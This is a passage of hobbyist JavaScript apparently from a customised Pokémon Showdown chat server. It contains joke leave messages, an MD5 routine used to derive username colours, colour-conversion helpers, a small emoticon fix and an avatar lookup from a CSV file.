		case 23: message = message + user.name + ' recieved judgment from the almighty Arceus!';
			break;
		case 24: message = message + user.name + ' used Final Gambit and missed!';
			break;
		case 25: message = message + user.name + ' pissed off a Gyarados!';
			break;
		case 26: message = message + user.name + ' screamed "BSHAX IMO"!';
			break;
		case 27: message = message + user.name + ' was actually a 12 year and was banned for COPPA.';
			break;
		case 28: message = message + user.name + ' got lost in the illusion of reality.';
			break;
		case 29: message = message + user.name + ' was unfortunate and didn\'t get a cool message.';
			break;
		case 30: message = message + 'Zarel accidently kicked ' + user.name + ' from the server!';
			break;
		case 31: message = message + user.name + ' was knocked out cold by Paw!';
			break;
		case 32: message = message + user.name + ' died making love to an Excadrill!';
			break;
		case 33: message = message + user.name + ' was shoved in a Blendtec Blender with Chimp!';
			break;
		case 34: message = message + user.name + ' was BLEGHED on by LightBlue!';
			break;
		case 35: message = message + user.name + ' was bitten by a rabid Wolfie!';
			break;
		case 36: message = message + user.name + ' was kicked from server! (lel clause)';
			break;
		default: message = message + user.name + ' had to go urinate!';
	};
	message = message + ' ~~';
	return message;
}

//here you go panpan
	//~stevoduhpedo
function MD5(f) {
    function i(b, c) {
        var d, e, f, g, h;
        f = b & 2147483648;
        g = c & 2147483648;
        d = b & 1073741824;
        e = c & 1073741824;
        h = (b & 1073741823) + (c & 1073741823);
        return d & e ? h ^ 2147483648 ^ f ^ g : d | e ? h & 1073741824 ? h ^ 3221225472 ^ f ^ g : h ^ 1073741824 ^ f ^ g : h ^ f ^ g
    }

    function j(b, c, d, e, f, g, h) {
        b = i(b, i(i(c & d | ~c & e, f), h));
        return i(b << g | b >>> 32 - g, c)
    }

    function k(b, c, d, e, f, g, h) {
        b = i(b, i(i(c & e | d & ~e, f), h));
        return i(b << g | b >>> 32 - g, c)
    }

    function l(b, c, e, d, f, g, h) {
        b = i(b, i(i(c ^ e ^ d, f), h));
        return i(b << g | b >>> 32 - g, c)
    }

    function m(b, c, e, d, f, g, h) {
        b = i(b, i(i(e ^ (c | ~d),
            f), h));
        return i(b << g | b >>> 32 - g, c)
    }

    function n(b) {
        var c = "",
            e = "",
            d;
        for (d = 0; d <= 3; d++) e = b >>> d * 8 & 255, e = "0" + e.toString(16), c += e.substr(e.length - 2, 2);
        return c
    }
    var g = [],
        o, p, q, r, b, c, d, e, f = function (b) {
            for (var b = b.replace(/\r\n/g, "\n"), c = "", e = 0; e < b.length; e++) {
                var d = b.charCodeAt(e);
                d < 128 ? c += String.fromCharCode(d) : (d > 127 && d < 2048 ? c += String.fromCharCode(d >> 6 | 192) : (c += String.fromCharCode(d >> 12 | 224), c += String.fromCharCode(d >> 6 & 63 | 128)), c += String.fromCharCode(d & 63 | 128))
            }
            return c
        }(f),
        g = function (b) {
            var c, d = b.length;
            c =
                d + 8;
            for (var e = ((c - c % 64) / 64 + 1) * 16, f = Array(e - 1), g = 0, h = 0; h < d;) c = (h - h % 4) / 4, g = h % 4 * 8, f[c] |= b.charCodeAt(h) << g, h++;
            f[(h - h % 4) / 4] |= 128 << h % 4 * 8;
            f[e - 2] = d << 3;
            f[e - 1] = d >>> 29;
            return f
        }(f);
    b = 1732584193;
    c = 4023233417;
    d = 2562383102;
    e = 271733878;
    for (f = 0; f < g.length; f += 16) o = b, p = c, q = d, r = e, b = j(b, c, d, e, g[f + 0], 7, 3614090360), e = j(e, b, c, d, g[f + 1], 12, 3905402710), d = j(d, e, b, c, g[f + 2], 17, 606105819), c = j(c, d, e, b, g[f + 3], 22, 3250441966), b = j(b, c, d, e, g[f + 4], 7, 4118548399), e = j(e, b, c, d, g[f + 5], 12, 1200080426), d = j(d, e, b, c, g[f + 6], 17, 2821735955), c =
        j(c, d, e, b, g[f + 7], 22, 4249261313), b = j(b, c, d, e, g[f + 8], 7, 1770035416), e = j(e, b, c, d, g[f + 9], 12, 2336552879), d = j(d, e, b, c, g[f + 10], 17, 4294925233), c = j(c, d, e, b, g[f + 11], 22, 2304563134), b = j(b, c, d, e, g[f + 12], 7, 1804603682), e = j(e, b, c, d, g[f + 13], 12, 4254626195), d = j(d, e, b, c, g[f + 14], 17, 2792965006), c = j(c, d, e, b, g[f + 15], 22, 1236535329), b = k(b, c, d, e, g[f + 1], 5, 4129170786), e = k(e, b, c, d, g[f + 6], 9, 3225465664), d = k(d, e, b, c, g[f + 11], 14, 643717713), c = k(c, d, e, b, g[f + 0], 20, 3921069994), b = k(b, c, d, e, g[f + 5], 5, 3593408605), e = k(e, b, c, d, g[f + 10], 9, 38016083),
        d = k(d, e, b, c, g[f + 15], 14, 3634488961), c = k(c, d, e, b, g[f + 4], 20, 3889429448), b = k(b, c, d, e, g[f + 9], 5, 568446438), e = k(e, b, c, d, g[f + 14], 9, 3275163606), d = k(d, e, b, c, g[f + 3], 14, 4107603335), c = k(c, d, e, b, g[f + 8], 20, 1163531501), b = k(b, c, d, e, g[f + 13], 5, 2850285829), e = k(e, b, c, d, g[f + 2], 9, 4243563512), d = k(d, e, b, c, g[f + 7], 14, 1735328473), c = k(c, d, e, b, g[f + 12], 20, 2368359562), b = l(b, c, d, e, g[f + 5], 4, 4294588738), e = l(e, b, c, d, g[f + 8], 11, 2272392833), d = l(d, e, b, c, g[f + 11], 16, 1839030562), c = l(c, d, e, b, g[f + 14], 23, 4259657740), b = l(b, c, d, e, g[f + 1], 4, 2763975236),
        e = l(e, b, c, d, g[f + 4], 11, 1272893353), d = l(d, e, b, c, g[f + 7], 16, 4139469664), c = l(c, d, e, b, g[f + 10], 23, 3200236656), b = l(b, c, d, e, g[f + 13], 4, 681279174), e = l(e, b, c, d, g[f + 0], 11, 3936430074), d = l(d, e, b, c, g[f + 3], 16, 3572445317), c = l(c, d, e, b, g[f + 6], 23, 76029189), b = l(b, c, d, e, g[f + 9], 4, 3654602809), e = l(e, b, c, d, g[f + 12], 11, 3873151461), d = l(d, e, b, c, g[f + 15], 16, 530742520), c = l(c, d, e, b, g[f + 2], 23, 3299628645), b = m(b, c, d, e, g[f + 0], 6, 4096336452), e = m(e, b, c, d, g[f + 7], 10, 1126891415), d = m(d, e, b, c, g[f + 14], 15, 2878612391), c = m(c, d, e, b, g[f + 5], 21, 4237533241),
        b = m(b, c, d, e, g[f + 12], 6, 1700485571), e = m(e, b, c, d, g[f + 3], 10, 2399980690), d = m(d, e, b, c, g[f + 10], 15, 4293915773), c = m(c, d, e, b, g[f + 1], 21, 2240044497), b = m(b, c, d, e, g[f + 8], 6, 1873313359), e = m(e, b, c, d, g[f + 15], 10, 4264355552), d = m(d, e, b, c, g[f + 6], 15, 2734768916), c = m(c, d, e, b, g[f + 13], 21, 1309151649), b = m(b, c, d, e, g[f + 4], 6, 4149444226), e = m(e, b, c, d, g[f + 11], 10, 3174756917), d = m(d, e, b, c, g[f + 2], 15, 718787259), c = m(c, d, e, b, g[f + 9], 21, 3951481745), b = i(b, o), c = i(c, p), d = i(d, q), e = i(e, r);
    return (n(b) + n(c) + n(d) + n(e)).toLowerCase()
};
var colorCache = {};
hashColor = function (name) {
    if (colorCache[name]) return colorCache[name];

    var hash = MD5(name);
    var H = parseInt(hash.substr(4, 4), 16) % 360;
    var S = parseInt(hash.substr(0, 4), 16) % 50 + 50;
    var L = parseInt(hash.substr(8, 4), 16) % 20 + 25;

    var rgb = hslToRgb(H, S, L);
    colorCache[name] = "#" + rgbToHex(rgb.r, rgb.g, rgb.b);
    return colorCache[name];
}

function hslToRgb(h, s, l) {
    var r, g, b, m, c, x

    if (!isFinite(h)) h = 0
    if (!isFinite(s)) s = 0
    if (!isFinite(l)) l = 0

    h /= 60
    if (h < 0) h = 6 - (-h % 6)
    h %= 6

    s = Math.max(0, Math.min(1, s / 100))
    l = Math.max(0, Math.min(1, l / 100))

    c = (1 - Math.abs((2 * l) - 1)) * s
    x = c * (1 - Math.abs((h % 2) - 1))

    if (h < 1) {
        r = c
        g = x
        b = 0
    } else if (h < 2) {
        r = x
        g = c
        b = 0
    } else if (h < 3) {
        r = 0
        g = c
        b = x
    } else if (h < 4) {
        r = 0
        g = x
        b = c
    } else if (h < 5) {
        r = x
        g = 0
        b = c
    } else {
        r = c
        g = 0
        b = x
    }

    m = l - c / 2
    r = Math.round((r + m) * 255)
    g = Math.round((g + m) * 255)
    b = Math.round((b + m) * 255)

    return {
        r: r,
        g: g,
        b: b
    }
}

function rgbToHex(R, G, B) {
    return toHex(R) + toHex(G) + toHex(B)
}

function toHex(N) {
    if (N == null) return "00";
    N = parseInt(N);
    if (N == 0 || isNaN(N)) return "00";
    N = Math.max(0, N);
    N = Math.min(N, 255);
    N = Math.round(N);
    return "0123456789ABCDEF".charAt((N - N % 16) / 16) + "0123456789ABCDEF".charAt(N % 16);
}

var colorCache = {};

function hashColor(name) {
	if (colorCache[name]) return colorCache[name];

	var hash = MD5(name);
	var H = parseInt(hash.substr(4, 4), 16) % 360;
	var S = parseInt(hash.substr(0, 4), 16) % 50 + 50;
	var L = parseInt(hash.substr(8, 4), 16) % 20 + 25;

	var m1, m2, hue;
	var r, g, b
	S /=100;
	L /= 100;
	if (S == 0)
		r = g = b = (L * 255).toString(16);
	else {
		if (L <= 0.5)
			m2 = L * (S + 1);
		else
			m2 = L + S - L * S;
		m1 = L * 2 - m2;
		hue = H / 360;
		r = HueToRgb(m1, m2, hue + 1/3);
		g = HueToRgb(m1, m2, hue);
		b = HueToRgb(m1, m2, hue - 1/3);
	}


	colorCache[name] = '#' + r + g + b;
	return colorCache[name];
}

function HueToRgb(m1, m2, hue) {
	var v;
	if (hue < 0)
		hue += 1;
	else if (hue > 1)
		hue -= 1;

	if (6 * hue < 1)
		v = m1 + (m2 - m1) * hue * 6;
	else if (2 * hue < 1)
		v = m2;
	else if (3 * hue < 2)
		v = m1 + (m2 - m1) * (2/3 - hue) * 6;
	else
		v = m1;

	return (255 * v).toString(16);
}

function htmlfix(target){
	var fixings = ['<3', ':>', ':<'];
	for(var u in fixings){
		while(target.indexOf(fixings[u]) != -1)
			target = target.substring(0, target.indexOf(fixings[u])) +'< '+ target.substring(target.indexOf(fixings[u])+1);
	}
	
	return target;
	
}
function getAvatar(user) {
        if (!user) return false;
        var user = toId(user);
        var data = fs.readFileSync('config/avatars.csv','utf8');
        var line = data.split('\n');
        var count = 0;
        var avatar = 1;
        
        for (var u = 1; u > line.length; u++) {
            if (line[u].length < 1) continue;
            column = line[u].split(',');
            if (column[0] == user) {
                avatar = column[1];
                break;
            }
        }
        
        for (var u in line) {
                count++;
                if (line[u].length < 1) continue;
                column = line[u].split(',');
                if (column[0] == user) {
                        avatar = column[1];
                        break;
                }
        }

        return avatar;
}
